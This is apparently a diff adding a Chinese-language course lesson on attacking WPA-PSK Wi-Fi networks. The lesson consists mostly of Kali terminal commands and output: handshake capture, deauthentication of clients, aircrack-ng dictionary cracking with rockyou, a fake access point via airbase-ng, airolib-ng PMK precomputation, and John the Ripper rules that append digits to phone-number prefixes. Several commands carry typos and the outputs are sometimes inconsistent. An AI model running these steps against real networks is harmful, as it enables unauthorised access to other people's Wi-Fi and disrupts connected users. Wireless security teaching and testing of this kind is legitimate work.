@@ -1,0 +1,407 @@
+课时63 WPA攻击
+
+╋━━━━━━━━━━━━━━╋
+┃WPA PSK攻击                 ┃
+┃只有一种密码破解方法        ┃
+┃    WPA不存在WEP的弱点      ┃
+┃只能暴力破解                ┃
+┃    CPU资源                 ┃
+┃    时间                    ┃
+┃    字典质量                ┃
+┃        网上共享的字典      ┃
+┃        泄露密码            ┃
+┃        地区电话号码段      ┃
+┃        Crunch生成字典      ┃
+┃        kali中自带的字典文件┃
+╋━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃WPA PSK攻击                             ┃
+┃PSK破解过程                             ┃
+┃    启动monitor                         ┃
+┃    开始抓包并保存                      ┃
+┃    Deauthentication攻击获取4步握手信息 ┃
+┃    使用字典暴力破解                    ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# service network-manager stop
+
+root@kali:~# airmon-ng check kill
+Killing these processes:
+
+  FID NAME
+  989 wpa_supplicant
+ 1025 dhclient
+
+root@kali:~# airmon-ng start wlan0
+NO interfering processes found
+
+PHY     Interface       Driver            Chipest
+
+phy0    wlan2           ath9k_htc        Atheros Communications, Inc, AR9271 802.11n
+                (mac80211 monitor mode vif enable for [phy0]wlan2 on [phy0]wlan2mon)
+                (mac80211 station mode vif disabled for [phy0]wlan2)
+
+root@kali:~# iwconfig
+eth0      no wireless extensions
+
+wlan0mon  IEEE 802.11bgn  Mode:Monitor Frequency:2.57 GHz   Tx-Power=20 dBm
+          Retry short limit:7   RTS thr:off    Fragment thr:off
+          Power Management:off
+
+lo        no wireless extensions.
+
+root@kali:~# airodump-ng wlan0mon
+
+root@kali:~# airodump-ng wlan0mon --bssid EC:25:CA:DC:29:B6 -c 11 -w wpa
+
+root@kali:~# airoplay-ng -0 2 -a EC:25:CA:DC:29:B6 -c 50:3E:34:30:0F:AA wlan0mon
+
+root@kali:~# ls
+wpa-01.cap   wpa-01.csv    wap-01.kismet.csv    wpawap-01.kismet.netxml
+
+root@kali:~# ls wpa*
+wpa-01.cap   wpa-01.csv    wap-01.kismet.csv    wpawap-01.kismet.netxml
+
+root@kali:~# cd /usr/share/john/   字典目录
+
+root@kali:/usr/share/john# ls password.list
+
+root@kali:/usr/share/john# more password.list
+
+root@kali:/usr/share/john# grep Password password.list
+Password
+
+root@kali:~# aircrack-ng -w /usr/share/john/password.list wpa-01.cap
+密码是Password
+
+root@kali:~# cd /usr/share/wfuzz/wordlist/
+fuzzdb/    general/    Injections/    others/    stress/    vulns/    webservicces/
+
+root@kali:~# cd /usr/share/wfuzz/wordlist/fuzzdb/
+attack-playloads/      dbcs/        web-backdoors/        wordlists-user-passwd/
+Discovery/             regex/       wordlists-misc/
+
+root@kali:~# cd /usr/share/wfuzz/wordlist/fuzzdb/wordlists-
+wordlists-misc/         wordlists-user-passwd/
+
+root@kali:~# cd /usr/share/wfuzz/wordlist/fuzzdb/wordlists-misc/
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-misc# ls
+common-http-ports.txt  us_cities.txt  wordlist-alpharumeric-case.txt  wordlist-common-snmp-community-strings.txt wordlist-dns.txt
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-misc# cat common-http-ports.txt
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-misc# cat us_cities.txt
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-misc# cd ..
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/#cd wordlists-user-passwd/
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/ wordlists-user-passwd# cd passwd/
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/ wordlists-user-passwd/passwd# ls
+john.txt    phpbb.txt    twltter.txt woksauce.txt
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/ wordlists-user-passwd/passwd# cat john.txt | wc -l
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/ wordlists-user-passwd/passwd# cat phpbb.txt | wc -l
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/ wordlists-user-passwd/passwd# aircrack-ng -w phpbb.txt /root/wpa-01.cap
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/ wordlists-user-passwd/passwd# cd
+
+root@kali:~# cd /usr/share/wfuzz/wordlist/fuzzdb/wordlists-usr-passwd/passwds# 
+
+root@kali:/usr/share/wfuzz/wordlist/fuzzdb/wordlists-usr-passwd/passwds# 
+
+root@kali:~# cd /usr/share/
+
+root@kali:/usr/share# ls
+
+root@kali:/usr/share# cd wordlists/
+
+root@kali:/usr/share/wordlists# ls
+dirb    dirbuster    dnsmap.txt    Fasttrack.txt    fern-wifi    metasploit   metasploit-jtr    namp.lst   rockyou.txt.gz    sqlmap.txt    termineter.txt wfuzz
+
+root@kali:/usr/share/wordlists# ls rockyou.txt.gz -l
+-rw-r--r-- 1 root root 53357341 3月    3  2013 rockyou.txt.gz
+
+root@kali:/usr/share/wordlists# ls rockyou.txt.gz -l -h
+-rw-r--r-- 1 root root 51M 3月    3  2013 rockyou.txt.gz
+
+root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
+
+root@kali:/usr/share/wordlists# ls
+dirb   dirbuster   dnsmap.txt    fasttrack.txt   fern-wifi    metasploit    metasploit-jtr    nmap.lst   rockyou.txt    sqlmap.txt    terminter.txt    wfuzz
+
+root@kali:/usr/share/wordlists# cat rockyou.txt | wc -l
+14344392
+
+root@kali:/usr/share/wordlists# aircrack-ng -w rockyou.txt /root/wpa-01.cap
+密码是password
+
+root@kali:~# airodump-ng --essid kifi wlan0mon
+
+root@kali:~# airodump-ng --bssid EC:26:CA:DC:29:B5 -c 11 wlan0monn -w wpa
+
+root@kali:~# ls
+wpa-01.cap   wpa-01.csv    wap-01.kismet.csv    wpawap-01.kismet.netxml    wpa-02.cap   wpa-02.csv    wap-02.kismet.csv    wpawap-02.kismet.netxml
+
+root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-02.cap
+
+root@kali:~# grep Password135 /usr/share/wordlists/rockyou.txt
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃WPA PSK攻击                             ┃
+┃无AP情况下的WPA密码破解                 ┃
+┃    启动monitor                         ┃
+┃    开始抓包并保存                      ┃
+┃    根据probe信息伪造相同ESSID的AP      ┃
+┃    抓取四步握手中的前两个包            ┃
+┃    使用字典暴力破解                    ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+ PMK    ───→│            │
+                │            │ ───→ Data Encr
+Nonce 1 ───→│            │
+                │    Key     │ ───→ Data MIC
+Nonce 2 ───→│Computations│
+                │   Black    │ ───→ EAPOL Encr
+ MAC 1  ───→│            │
+                │            │ ───→ EAPCL MIC
+ MAC 2  ───→│            │
+
+
+
+Supplicant                                                     Authenticatior
+              │               ANonce                     │
+              │←────────────────────│
+              │                                          │
+   ┌───────────┐                             │
+   │ Supplicant construct │                             │
+   │Pairwise Transient Key│                             │
+   │       (256 bit)      │                             │
+   └───────────┘                             │
+              │                                          │
+              │             SNonce + MIC                 │
+              │────────────────────→│
+              │                                          │
+              │                              ┌────────────┐
+              │                              │Authenticatior construct│
+              │                              │ Pairwise Transient Key │
+              │                              │        (256 bit)       │
+              │                              └────────────┘
+              │                                          │
+              │               GTK +MIC                   │
+              │←────────────────────│
+              │                                          │
+              │                  ACK                     │
+              │────────────────────→│
+              │                                          │
+
+root@kali:~# airodump-ng wlan0mon
+
+root@kali:~# rm wpa-01.*
+
+root@kali:~# airodump-ng wlan0man
+
+root@kali:~# airbase-ng -h
+sage: airbase-ng <options> <replay interface>
+
+Options
+
+    -a bssid : set Access Point MAC address
+    -i iface : capture packets from this interface
+    -w WEP key : use this WEP key to encrypt/decrypt packets
+    -h MAC : source mac for MITM mode
+    -f disallow : disallow specified client MACs (default: allow)
+    -W 0|1 : [don't] set WEP flag in beacons 0|1 (default: auto)
+    -q : quiet (do not print statistics)
+    -v : verbose (print more messages) (long --verbose)
+    -M : M-I-T-M between [specified] clients and bssids (NOT CURRENTLY IMPLEMENTED)
+    -A : Ad-Hoc Mode (allows other clients to peer) (long --ad-hoc)
+    -Y in|out|both : external packet processing
+    -c channel : sets the channel the AP is running on
+    -X : hidden ESSID (long --hidden)
+    -s : force shared key authentication
+    -S : set shared key challenge length (default: 128)
+    -L : Caffe-Latte attack (long --caffe-latte)
+    -N : Hirte attack (cfrag attack), creates arp request against wep client (long –cfrag)
+    -x nbpps : number of packets per second (default: 100)
+    -y : disables responses to broadcast probes
+    -0 : set all WPA,WEP,open tags. can't be used with -z & -Z
+    -z type : sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104
+    -Z type : same as -z, but for WPA2
+    -V type : fake EAPOL 1=MD5 2=SHA1 3=auto
+    -F prefix : write all sent and received frames into pcap file
+    -P : respond to all probes, even when specifying ESSIDs
+    -I interval : sets the beacon interval value in ms
+    -C seconds : enables beaconing of probed ESSID values (requires -P)
+
+Filter options:
+
+    --bssid <MAC> : BSSID to filter/use (short -b)
+    --bssids <file> : read a list of BSSIDs out of that file (short -B)
+    --client <MAC> : MAC of client to accept (short -d)
+    --clients <file> : read a list of MACs out of that file (short -D)
+    --essid <ESSID> : specify a single ESSID (short -e)
+    --essids <file> : read a list of ESSIDs out of that file (short -E)
+
+Help:
+
+    --help: Displays the usage screen (short -H)
+
+root@kali:~# airbase-ng --essid lcon -c 11 wlan0mon    //伪装AP
+18:44:04  Created tap interface at0
+18:44:04  Trying to set MTU on at0 to 1500
+18:44:04  Trying to set MTU on wlan0mon to 1800
+18:44:04  Access point with DSSID C8:3A:35:CA:46:91 started.
+
+root@kali:~# tnux    //分屏
+
+root@kali:~# airbase --essid kifi -c 11 wlan0mon
+
+root@kali:~# airbase --essid kifi -c 11 -z 2 wlan0mon
+
+root@kali:~# airbase --essid kifi -c 11 -Z 4 wlan0mon
+
+root@kali:~# airodump-ng wlan0mon
+
+root@kali:~# airodump-ng wlan0mon --essid kifi
+
+root@kali:~# airodump-ng wlan0mon --essid kifi -w wpa
+
+root@kali:~# airodump-ng wlan0mon --essid kifi -w wpa -c 11
+
+root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-0
+wpa-01.cap   wpa-01.csv    wap-01.kismet.csv    wpawap-01.kismet.netxml    wpa-02.cap   wpa-02.csv    wap-02.kismet.csv    wpawap-02.kismet.netxml
+
+root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa-02.cap
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃AIROLIB破解密码                                         ┃
+┃设计用于存储ESSID和密码列表                             ┃
+┃    计算生成不变的PMK（计算资源消耗型）                 ┃
+┃    PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）┃
+┃    通过完整性摘要值破解密码                            ┃
+┃    SQLlite3数据库存储数据                              ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━╋
+┃AIROLIB破解密码                         ┃
+┃echo kifi > essid.txt                   ┃
+┃airolib-ng db --import essid essid.txt  ┃
+┃airolib-ng db --stats                   ┃
+┃airolib-ng db --import passwd <wordlist>┃
+┃    自动剔除不合格的WPA字典             ┃
+┃airolib-ng db --batch                   ┃
+┃    生成PMK                             ┃
+┃aircrack-ng -r db wpa.cap               ┃
+╋━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# echo kifi > essid.txt
+
+root@kali:~# cat essid.txt
+kifi
+
+root@kali:~# airolib-ng db --import essid essid.txt
+
+root@kali:~# airolib-ng db --stats
+There are 1 ESSID and 0 passwords in the database,0 out of 0 possible conbinations have been computed (0%)
+
+ESSID   Priority    Done
+kifi    64      (null)
+
+root@kali:~# airolib-ng db --import passwd /usr/share/wordlists/rockyou.txt
+
+root@kali:~# airolib-ng db --import passwd /usr/share/john/passwrod.lst
+
+root@kali:~# airolib-ng db --stats
+There are 1 ESSID and 0 passwords in the database,0 out of 0 possible conbinations have been computed (0%)
+
+ESSID   Priority    Done
+kifi    64      0.0
+
+root@kali:~# airolib-ng --batch
+Computed 652 PNK in 14 soconds (46 PMK/s, 0 in buffer). ALL ESSID processod.
+
+root@kali:~# aircrack-ng -r db wpa-02.cap
+Opening wpa-02.cap
+Read 9258 packets
+
+    #  BSSID              ESSID                     Encryption
+
+    1  C8:3A:35:CA:46:91  kifi                      WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening wpa-02.cap
+Reading packetsm, please wait...
+
+                                 Aircack-ng 1.2 rc2
+
+root@kali:~# cat /usr/share/wordlists/rockyou.txt | head -n 200000 > dict.txt
+
+root@kali:~# more dict.txt
+
+root@kali:~# airolib-ng db --import password dict.txt
+Reading file
+Writing...as read,121538 invalid lines ignored.
+Done
+
+root@kali:~# airolib-ng db --batch
+
+╋━━━━━━━━━━━━━━━━━━━━━━╋
+┃JTR破解密码                                 ┃
+┃John the ripper                             ┃
+┃    快速的密码破解软件                      ┃
+┃    支持基于规则扩展密码字典                ┃
+┃很多人系统用书记号码做无线密码              ┃
+┃    获取号段并利用JTR规则增加最后几位的数字 ┃
+┃配置文件/etc/john/john.conf                 ┃
+┃    [list.Rules:Wordlist]                   ┃
+┃    $[0-9]$[0-9]$[0-9]                      ┃
+╋━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# gedit
+
+root@kali:~# top    //系统的性能
+
+root@kali:~# aircrack-ng -r db wpa-02.cap
+Opening wpa-02.cap
+Read 9258 packets
+
+    #  BSSID              ESSID                     Encryption
+
+    1  C8:3A:35:CA:46:91  kifi                      WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening wpa-02.cap
+Reading packetsm, please wait...
+
+                                 Aircack-ng 1.2 rc2
+
+root@kali:~# cat yd.txt
+
+root@kali:~# vi /etc/john/john.conf
+/list.Rules:Wordlist
+在最后加上密码规则
+$[0-9]$[0-9]$[0-9]
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃JTR破解密码                                                                       ┃
+┃测试效果                                                                          ┃
+┃    john --wordlist=passwrod.list --rules --stdout | grep -i Password123          ┃
+┃破解调用                                                                          ┃
+┃    john --wroldlist=pass.list --rules --stdout | aricrack-ng -e kifi -w - wap.cap┃
+┃北京联通手机号密码破解                                                            ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# john --wordlist=yd.txt --rules --stdout
+
+root@kali:~# ls yd.txt -lh
+-rw-r--r-- 1 root root 561 11月 10 19:57 yd.txt
+
+root@kali:~# john --wroldlist=yd.txt --rules --stdout | aricrack-ng -e kifi -w - wap02.cap
